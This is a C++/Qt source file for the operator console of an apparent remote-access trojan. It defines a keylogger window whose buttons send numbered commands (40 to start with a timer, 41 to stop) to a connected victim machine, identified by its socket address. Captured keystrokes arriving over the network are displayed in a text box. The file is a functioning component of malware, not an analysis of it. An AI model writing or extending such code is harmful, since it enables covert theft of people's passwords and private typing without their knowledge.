#include "mykeylogWindows.h"
#include <QApplication>
#include <QDesktopWidget>
#include "mystruct.cpp"
#include "tool.h"
mykeylogWindows::mykeylogWindows(QWidget *parent,netManager* nm) : QWidget(parent)
{
    setAttribute(Qt::WA_DeleteOnClose, true);
    this->nm=nm;
    b_start=new QPushButton(this);
    b_stop=new QPushButton(this);
    b_clear=new QPushButton(this);
    l_time=new QLabel(this);
    t_time=new QLineEdit(this);
    showinfo=new QTextEdit(this);
    showinfo->setFont(QFont(tr("Consolas"), 12));

    l_time->setText("设置时间");
    t_time->setText("0");
    b_start->setText("开始");
    b_stop->setText("结束");
    b_clear->setText("清空");
    showinfo->setReadOnly(true);

    const int w = 600, hh = 450;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - hh) >> 1;
    this->setGeometry(x, y, w, hh);
    //设置显示的位置和大小
    setFixedSize(this->width(), this->height());
    //设置不可调节大小
    this->setWindowTitle("keylog"+tool::GetAddressBySocket(nm->sClient));
    this->setWindowIcon(QIcon(":/image/image/keylog.png"));
    this->setWindowFlags(this->windowFlags()& ~Qt::WindowMaximizeButtonHint);
    //隐藏最大最小按钮
    v=new QVBoxLayout();
    h=new QHBoxLayout();

    h->addWidget(l_time,1);
    h->addWidget(t_time,1);
    h->addWidget(b_start,2);
    h->addWidget(b_stop,2);
    h->addWidget(b_clear,2);

    v->addWidget(showinfo,5);
    v->addLayout(h,1);


    this->setLayout(v);

    connect(b_start, SIGNAL(clicked(bool)), this, SLOT(start()));
    connect(b_stop, SIGNAL(clicked(bool)), this, SLOT(stop()));
    connect(b_clear, SIGNAL(clicked(bool)), this, SLOT(clear()));

    connect(nm,SIGNAL(signalAddKeylog(QString)),this,SLOT(addKeylog(QString)));



}

mykeylogWindows::~mykeylogWindows(){
//    disconnect(nm,SIGNAL(signalAddKeylog(QString)),this,SLOT(addKeylog(QString)));
    nm->keylogwindows=nullptr;
//    delete[] b_start;
//    delete[] b_stop;
//    delete[] b_clear;
//    delete[] t_time;
//    delete[] showinfo;
//    delete[] l_time;
//    delete[] v;
//    delete[] h;
//    b_start=nullptr;
//    b_stop=nullptr;
//    b_clear=nullptr;
//    t_time=nullptr;
//    showinfo=nullptr;
//    l_time=nullptr;
//    v=nullptr;
//    h=nullptr;
}


void mykeylogWindows::start(){
    int time = t_time->text().toInt();
//    std::cout<<time<<std::endl;
    morder tmporder;
    tmporder.orderType=40;
    tmporder.orderMem=new char[4];
    for(int i=0;i<4;i++){
        tmporder.orderMem[i]=time%0x100;
        time/=0x100;
    }

    tmporder.orderSize=4;

    nm->orderQueue.push(tmporder);
    nm->addOrder();



}

void mykeylogWindows::stop(){

    morder tmporder;
    tmporder.orderType=41;

    tmporder.orderMem=nullptr;
    tmporder.orderSize=0;

    nm->orderQueue.push(tmporder);
    nm->addOrder();

}

void mykeylogWindows::clear(){
    showinfo->clear();
}

void mykeylogWindows::addKeylog(QString s){


    showinfo->moveCursor(QTextCursor::End);
    showinfo->insertPlainText(s);
    showinfo->moveCursor(QTextCursor::End);
}




